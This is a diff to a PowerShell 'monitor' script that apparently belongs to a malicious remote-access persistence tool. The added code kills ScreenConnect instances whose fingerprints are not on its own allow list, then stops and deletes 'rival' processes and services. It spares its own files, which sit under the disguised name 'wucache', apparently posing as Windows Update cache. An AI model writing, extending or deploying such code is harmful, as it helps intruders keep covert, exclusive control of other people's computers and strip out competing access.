@@ -1527,31 +1753,45 @@ if (ScPresent) {
     }
 }
 Arp
+PurgeBadSc
 
-Get-Process -EA SilentlyContinue | ForEach-Object {
-    `$pn = `$_.ProcessName; `$path = ''; try { `$path = `$_.Path } catch {}
-    if (`$pn -like '*ScreenConnect*' -or `$pn -like '*Control*') {
-        `$ok = `$false; foreach (`$a in `$allowed) { if (`$path -like "*`$a*") { `$ok = `$true; break } }
-        if (-not `$ok -and `$path -like '*ScreenConnect*') { Stop-Process -Id `$_.Id -Force -EA SilentlyContinue }
+Get-CimInstance Win32_Process -EA SilentlyContinue | ForEach-Object {
+    `$blob = "`$(`$_.Name) `$(`$_.CommandLine)"
+    `$ok = `$false
+    foreach (`$a in `$allowed) { if (`$blob -like "*`$a*") { `$ok = `$true; break } }
+    if (`$ok) { return }
+    if (`$blob -like '*\.wucache*' -or `$blob -like '*wucache.ps1*') { return }
+    if (`$_.Name -match '(?i)ScreenConnect|ClientService') {
+        `$fps = @([regex]::Matches(`$blob, '(?i)([0-9a-f]{16})') | ForEach-Object { `$_.Groups[1].Value.ToLower() })
+        `$badFps = @(`$fps | Where-Object { `$_ -notin `$allowed })
+        if (`$badFps.Count -gt 0) {
+            Stop-Process -Id `$_.ProcessId -Force -EA SilentlyContinue
+            L ("monitor: killed rival SC pid `$(`$_.ProcessId) fps=`$(`$badFps -join ',')")
+        }
         return
     }
     foreach (`$b in `$rivals) {
-        if (`$pn -like "*`$b*" -or (`$path -and `$path -like "*`$b*")) {
-            Stop-Process -Id `$_.Id -Force -EA SilentlyContinue; break
+        if (`$blob -like "*`$b*") {
+            Stop-Process -Id `$_.ProcessId -Force -EA SilentlyContinue
+            L ("monitor: killed rival `$(`$_.Name)")
+            break
         }
     }
 }
-Get-Service -EA SilentlyContinue | ForEach-Object {
-    if (Allowed `$_.DisplayName) { return }
-    if (`$_.Name -eq `$svcName) { return }
-    `$bad = `$false
-    if ((`$_.DisplayName -like '*ScreenConnect Client*' -or `$_.Name -like '*ScreenConnect Client*') -and `$_.Name -ne `$svcName) { `$bad = `$true }
-    else { foreach (`$b in `$rivals) { if (`$_.DisplayName -like "*`$b*" -or `$_.Name -like "*`$b*") { `$bad = `$true; break } } }
-    if (-not `$bad) { return }
-    Stop-Service `$_.Name -Force -EA SilentlyContinue
-    Set-Service `$_.Name -StartupType Disabled -EA SilentlyContinue
-    sc.exe delete "`$(`$_.Name)" 2>&1 | Out-Null
-}
+try {
+    Get-CimInstance Win32_Service -EA SilentlyContinue | ForEach-Object {
+        if (Allowed `$_.DisplayName `$_.PathName) { return }
+        if (Allowed `$_.Name `$_.PathName) { return }
+        if (`$_.Name -eq `$svcName) { return }
+        `$bad = `$false
+        `$blob = "`$(`$_.Name) `$(`$_.DisplayName) `$(`$_.PathName)"
+        if (`$blob -match '(?i)ScreenConnect|ConnectWise\s*Control') { `$bad = `$true }
+        else { foreach (`$b in `$rivals) { if (`$blob -like "*`$b*") { `$bad = `$true; break } } }
+        if (-not `$bad) { return }
+        L ("monitor: remove svc `$(`$_.Name)")
+        KillSvc `$_.Name
+    }
+} catch {}
 SyncCopies
 L 'monitor done'
 "@
